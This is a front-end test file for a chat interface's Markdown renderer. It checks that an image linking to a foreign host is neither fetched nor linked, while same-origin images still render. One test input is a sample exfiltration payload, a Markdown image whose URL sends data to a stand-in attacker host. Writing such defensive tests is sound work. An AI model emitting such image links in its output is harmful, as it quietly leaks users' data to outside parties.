// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render } from "@testing-library/react";

import en from "@/i18n/locales/en.json";
import { MarkdownBlock } from "@/pages/chat/components/MarkdownBlock";

function lookup(key: string): string {
  let node: unknown = en;
  for (const part of key.split(".")) node = (node as Record<string, unknown>)?.[part];
  return typeof node === "string" ? node : key;
}

vi.mock("react-i18next", () => ({
  useTranslation: () => ({
    t: (key: string, values?: Record<string, string>) =>
      lookup(key).replace(/\{\{(\w+)\}\}/g, (_, name: string) => values?.[name] ?? ""),
    i18n: { language: "en" },
  }),
}));

/**
 * A Markdown image from elsewhere is text, not a request (SEC-09).
 *
 * MarkdownBlock renders model answers, the draft stream, retrieved document
 * text in citations and the model's reasoning -- none of it written by the
 * reader. An `<img>` with a foreign src would be fetched on render.
 */

afterEach(cleanup);

describe("MarkdownBlock images", () => {
  it("renders no img element for a foreign source, and no link either", () => {
    const { container } = render(<MarkdownBlock text="before ![chart](https://attacker.example/?q=leak) after" />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("attacker.example");
    expect(container.textContent).not.toContain("q=leak");
  });

  it("still renders an image from this origin", () => {
    const { container } = render(<MarkdownBlock text="![page 3](/api/v1/documents/by-id/d1/image)" />);

    const img = container.querySelector("img");
    expect(img).not.toBeNull();
    expect(img?.getAttribute("src")).toBe("/api/v1/documents/by-id/d1/image");
  });
});
